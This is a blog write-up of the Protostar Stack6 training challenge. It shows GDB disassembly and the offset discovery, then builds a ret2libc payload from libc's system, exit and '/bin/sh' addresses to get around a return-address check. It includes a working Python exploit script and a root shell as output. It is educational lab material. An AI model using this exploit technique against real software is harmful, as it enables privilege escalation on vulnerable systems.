---
layout: post
title: "B2B - Protostar, Stack6 (x86)"




---

## Introduction:

B2B is a series I have forced upon myself to make sure my basics are covered when it comes to exploitation. After passing my OSCE, I took a little break from exploitation to focus on a few work aspects, but now I am hungry for more lower level nonsense. 

This series will focus mainly on exploitation challenges which cover various techniques. First of which, is the stack overflow challenges within the Protostar image from "exploit education" found <a href="https://exploit.education/protostar/">here</a>. I gave myself two main rules to stick to whilst working through all these challenges.

1) Don't read the C source code for each challenge, only the hints section if required

2) Don't read other peoples write ups for these challenges unless I have already finished it and want to see other routes to further my interest

## Stack 6

The seventh challenge of Protostar is "Stack 6". I approached each challenge with a similar set of steps, so each post will likely follow a similar template(ish). Including initial running, inspecting the disassembly of the binary and some other specific steps in between before finally crafting a payload and owning the process.

Our initial use of the program identified the following:

```
$ ./stack6
input path please: test
got path test
```

The program simply appears to take a single input, presumably does something with it in the background and then prints some output based on the value that was specified. In this case, the binary took the string "test" as it's "input path", and printed "got path test". This is a different set of output compared to our previous challenges, which looks like we might have a new challenge on our hands.

Similar to the last challenge, I started this one off by looking at the hints. I knew it would be another stack based buffer overflow, however I was more curious to see what direction they had decided to go in since we have now done an overflow with our own shellcode.

The hints for this challenge are:

- Stack6 looks at what happens when you have restrictions on the return address.
- This level can be done in a couple of ways, such as finding the duplicate of the payload (objdump -s will help with this), or ret2libc , or even return orientated programming.

So from the hints alone, we can see that we have a  limit on our return address, which we should be able to identify when disassembling the binary and we can attempt to exploit the vulnerability with ROP  or ret2libc. This either means the DEP bit has been set during compilation or the binary has been designed to prevent us from jumping to shellcode within our buffer (emulating a non-executable stack or similar).

A quick note about ret2libc attacks, Ippsec has an amazing video focusing on the HacktheBox target 'October', which is a pretty old box. This, if I remember right, had a ret2libc overflow for it's priv esc route and the video was flawless. Highly recommend checking that out for a much better explanation than I can give. However for the sake of my own knowledge and refresher, I will jot down a few points about ret2libc to help cover the "why" and "whats" of the technique.

- Poor mans ROP
- Doesn't need custom shellcode
- Uses pre-existing/compiled code to pop a shell via system

Now, back to the task at hand. As usual,  I fired up the binary in GDB and checked out it's contents. First I inspected the functions:

```
(gdb) info functions
All defined functions:

File stack6/stack6.c:
void getpath(void);
int main(int, char **);
```

This time around we have a main function, and a getpath function. Let's first check out the main function:

```
(gdb) disas main
Dump of assembler code for function main:
0x080484fa <main+0>:	push   ebp
0x080484fb <main+1>:	mov    ebp,esp
0x080484fd <main+3>:	and    esp,0xfffffff0
0x08048500 <main+6>:	call   0x8048484 <getpath>
0x08048505 <main+11>:	mov    esp,ebp
0x08048507 <main+13>:	pop    ebp
0x08048508 <main+14>:	ret    
End of assembler dump.
```

If we break this short function down, we simply see the following:

- Makes a call to getpath() <-- this presumably handles the majority of the programs logic

As the main function doesn't appear to do anything but call getpath(), we should disassemble this function and inspect what is happening:

```
(gdb) disas getpath 
Dump of assembler code for function getpath:
0x08048484 <getpath+0>:	push   ebp
0x08048485 <getpath+1>:	mov    ebp,esp
0x08048487 <getpath+3>:	sub    esp,0x68
0x0804848a <getpath+6>:	mov    eax,0x80485d0
0x0804848f <getpath+11>:	mov    DWORD PTR [esp],eax
0x08048492 <getpath+14>:	call   0x80483c0 <printf@plt>
0x08048497 <getpath+19>:	mov    eax,ds:0x8049720
0x0804849c <getpath+24>:	mov    DWORD PTR [esp],eax
0x0804849f <getpath+27>:	call   0x80483b0 <fflush@plt>
0x080484a4 <getpath+32>:	lea    eax,[ebp-0x4c]
0x080484a7 <getpath+35>:	mov    DWORD PTR [esp],eax
0x080484aa <getpath+38>:	call   0x8048380 <gets@plt>
0x080484af <getpath+43>:	mov    eax,DWORD PTR [ebp+0x4]
0x080484b2 <getpath+46>:	mov    DWORD PTR [ebp-0xc],eax
0x080484b5 <getpath+49>:	mov    eax,DWORD PTR [ebp-0xc]
0x080484b8 <getpath+52>:	and    eax,0xbf000000
0x080484bd <getpath+57>:	cmp    eax,0xbf000000
0x080484c2 <getpath+62>:	jne    0x80484e4 <getpath+96>
0x080484c4 <getpath+64>:	mov    eax,0x80485e4
0x080484c9 <getpath+69>:	mov    edx,DWORD PTR [ebp-0xc]
0x080484cc <getpath+72>:	mov    DWORD PTR [esp+0x4],edx
0x080484d0 <getpath+76>:	mov    DWORD PTR [esp],eax
0x080484d3 <getpath+79>:	call   0x80483c0 <printf@plt>
0x080484d8 <getpath+84>:	mov    DWORD PTR [esp],0x1
0x080484df <getpath+91>:	call   0x80483a0 <_exit@plt>
0x080484e4 <getpath+96>:	mov    eax,0x80485f0
0x080484e9 <getpath+101>:	lea    edx,[ebp-0x4c]
0x080484ec <getpath+104>:	mov    DWORD PTR [esp+0x4],edx
0x080484f0 <getpath+108>:	mov    DWORD PTR [esp],eax
0x080484f3 <getpath+111>:	call   0x80483c0 <printf@plt>
0x080484f8 <getpath+116>:	leave  
0x080484f9 <getpath+117>:	ret    
End of assembler dump.
```

This is more like it, lots more seems to be going on here! Let's break this down to a higher level and see what it looks like:

- grow the stack by 0x68 bytes
- print is called, which likely prints the 'input path please:' string
- gets() is then used to take the user input <-- buffer overflow vulnerability
- An 'and' and 'cmp' instruction are done with EAX and the value '0xbf000000' value. This is likely the 'return address restriction' stated in the hints section
- The win/fail state is determined by a 'jne' instruction with the previously mentioned comparison. If are equal to the restricted value (after the 'and' calculation), we don't jump and exit() instead. If we don't equal that value, we jump over the exit() and carry on. This is likely our route for pwning it.

To start inspecting the memory during the input process, I place a breakpoint on the gets() function, step over and use the string "AAAABBBBCCCC" so I can easily see the characters in the stack:

```
(gdb) b *getpath+38
Breakpoint 1 at 0x80484aa: file stack6/stack6.c, line 13.
(gdb) r
Starting program: /opt/protostar/bin/stack6 
input path please: 
Breakpoint 1, 0x080484aa in getpath () at stack6/stack6.c:13
13	stack6/stack6.c: No such file or directory.
in stack6/stack6.c
(gdb) ni
AAAABBBBCCCC
15	in stack6/stack6.c
(gdb) x/30wx $esp
0xbffffc30:	0xbffffc4c	0x00000000	0xb7fe1b28	0x00000001
0xbffffc40:	0x00000000	0x00000001	0xb7fff8f8	0x41414141 <-- input starts here
0xbffffc50:	0x42424242	0x43434343	0xbffffc00	0xb7eada75
0xbffffc60:	0xb7fd7ff4	0x080496ec	0xbffffc78	0x0804835c
0xbffffc70:	0xb7ff1040	0x080496ec	0xbffffca8	0x08048539
0xbffffc80:	0xb7fd8304	0xb7fd7ff4	0x08048520	0xbffffca8
0xbffffc90:	0xb7ec6365	0xb7ff1040	0xbffffca8	0x08048505
0xbffffca0:	0x08048520	0x00000000
```

Now we know our input starts from the address "0xbffffc4c", we can see where the return address limitation comes in to play. From first glance, the restriction checks to see if our return address (EIP overwrite) equals "0xbf000000" after performing an 'and' calculation against the address with the value "0xbf000000". Without getting into this instruction too much, if we 'and' out input start address and the value specified, we should get the result "0xbf000000". Ultimately, this means we can't overwrite the EIP value with an address on our stack.  In short, we can't just jump to our own shellcode - sadface. Even if the stack is executable (which I haven't confirmed at this point), we wouldn't be  able to just jump to it and run the code.

We can check that this is the case by gaining control of the process EIP and attempting to return to a position in our buffer to see what happens. By using a long, easily recognisable string as input, we can see the value that overwrites our EIP and causes a crash. Giving us our offset:

```
(gdb) c
Continuing.
got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
```

As  our EIP was overwritten with "0x55555555" we failed to continue and the program crashed. "0x55" in ASCII is "U", so we can get our offset with the following logic:

- U is the 21's letter of the alphabet
- Our payload had 4 of each letter
- Then we minus 4 to get the offset BEFORE we write the U's
- 21 * 4 = 84 - 4 = 80

This means we should have control of EIP with the following payload:

```
python -c 'print "A"*80 + "BBBB"' > /tmp/stack6
```

```
(gdb) r < /tmp/stack6
Starting program: /opt/protostar/bin/stack6 < /tmp/stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

Excellent! Now let's just replace this value with an address within our payload and see what happens (this is where we should trigger the "and/cmp" instruction:

```
python -c 'print "A"*80 + "\x54\xfc\xff\xbf"' > /tmp/stack6
```

If we break on the 'and' instruction and inspect our EAX register, we see the following:

```
(gdb) b *getpath+52
```

```
(gdb) i r $eax
	eax            0xbffffc54	-1073742764
```

At this point, EAX is equal to our return address (in this case, our EIP overwrite).

Now if we step over one more instruction with 'ni', we should see our new EAX now equals the restricted return value:

```
(gdb) ni
0x080484bd	17	in stack6/stack6.c
(gdb) i r $eax
eax            0xbf000000	-1090519040
```

Stepping over again, we hit out fail condition and the process errors out:

```
(gdb) c
Continuing.
bzzzt (0xbffffc54)

Program exited with code 01.
```

Now we have proven that we aren't able to return into our payload and jump to some user defined shellcode, we know we need a different attack vector. This is where the 'ret2libc / ROP' hints becomes relevant.

There are a couple of things we need for a ret2libc attack, again, if you haven't done one before, check out the IppSec video or other various write ups to help piece together the puzzle. Effectively, we want to find a system() call, a '/bin/sh' string and an exit() call within the libc library that has been compiled into the binary.

Luckily, we can get all the information we require directly from GDB. First off we want to find the libc library that has been compiled into the binary:

```
(gdb) info proc mappings
process 2647
cmdline = '/opt/protostar/bin/stack6'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/stack6'
Mapped address spaces:

    Start Addr   End Addr       Size     Offset objfile
    0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
    0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
    0xb7e96000 0xb7e97000     0x1000          0        
    0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
    0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
    0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
    0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
    0xb7fd9000 0xb7fdc000     0x3000          0        
    0xb7fe0000 0xb7fe2000     0x2000          0        
    0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
    0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
    0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
    0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
    0xbffeb000 0xc0000000    0x15000          0           [stack]
```

From the above, we can see the base address of libc is "0xb7e97000" and the actual library itself is located in "/lib/libc-2.11.2.so". Also the return address limitation will not be triggered by a return address in this library as  we will not be within the "0xbf000000" - "0xbfffffff" range.

Now we know our base address (which will come in handy shortly), we want to find the addresses of two libc functions, system() and exit(). Again, we can use GDB to find these in the current process:

```
(gdb) print system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>

(gdb) print exit
$1 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>
```

These will make sense if you know how to do ret2libc attacks or have read additional information about them. I am just going to assume you are comfy with it and can continue following along. Our final goal is to find the offset of the string "/bin/sh" within libc. This can be easily done with 'strings':

```
$  strings -a -t x /lib/libc-2.11.2.so | grep /bin/sh
11f3bf /bin/sh
```

We want to use this offset with the base address to give us the exact location of this string within the processes memory:

​	"0xb7e97000" + "0x0011f3bf" = "0xb7fb63bf"

So, we now have the three important addresses we need to complete our ret2libc attack:

- system()   =>   0xb7ecffb0
- exit()         =>   0xb7ec60c0
- /bin/sh     =>   0xb7fb63bf

Okay, so now we have our important values, we need to know how our call to system() will look. As this is x86, we need to adhere to the calling convention of a function. Arguments are pushed onto the stack in the parameter order, followed by the call. So if we reverse this for our payload we will be pushing our function, followed by a pointer to our argument.

For a ret2libc attack, we want our payload to look like the following:

	junk + system() + exit() + "/bin/sh"

Breaking this down, we have our "A" buffer, followed by our EIP overwrite which is our system() call, followed by the return address that we want to land in after our system() call, in this case exit(). Finally followed by the address of our system() parameter, which in this case is our "/bin/sh" string located within libc itself. 

With our previously calculated values, let's try out a payload. This is the first stack challenge where I needed a little script to complete the generation of the payload. With various values required, it felt easier in the text editor rather than a one-liner:

stack6.py:

```
import struct
def build():
    libc_base = 0xb7e97000
    binsh_offset = 0x11f3bf
  
    string_addr = libc_base + binsh_offset
    system_addr = 0xb7ecffb0
    exit_addr = 0xb7ec60c0

    padding = 'A' * 80

    payload = padding
    payload += struct.pack("I", system_addr)
    payload += struct.pack("I", exit_addr)
    payload += struct.pack("I", string_addr)
    print payload

build()
```

Now we have our script, let's try to exploit this overflow with our newly crafted ret2libc payload:

```
$ python /tmp/stack6.py | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAA����`췿c��
$ 
```

It looks like our shell is instantly exiting like last time. To confirm our system call is being executed correctly we can step through the exploit in GDB. If we break on the gets() function, similar to before, and then step through instructions with 'ni', we eventually see a call to system() with our argument:

```
(gdb) 
got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAA����`췿c��
23	in stack6/stack6.c
(gdb) 
0x080484f9 in getpath () at stack6/stack6.c:23
23	in stack6/stack6.c
(gdb) ni
__libc_system (line=0xb7fb63bf "/bin/sh") at ../sysdeps/posix/system.c:179
179	../sysdeps/posix/system.c: No such file or directory.
	in ../sysdeps/posix/system.c
```

Now we can see this is actually being called with our "/bin/sh" argument, let's try the 'cat' trick outside of GDB similar to the stack5 challenge:

```
$ (python /tmp/stack6.py; cat) | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAA����`췿c��
whoami
root
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

This is awesome! We have now completed a ret2libc challenge, which had a specific limitation on the return address. Not only that, but we wrote a little script to generate the payload and we calculated offsets and learnt how to find base addresses and including  libraries. Only one more stack challenge left of the series!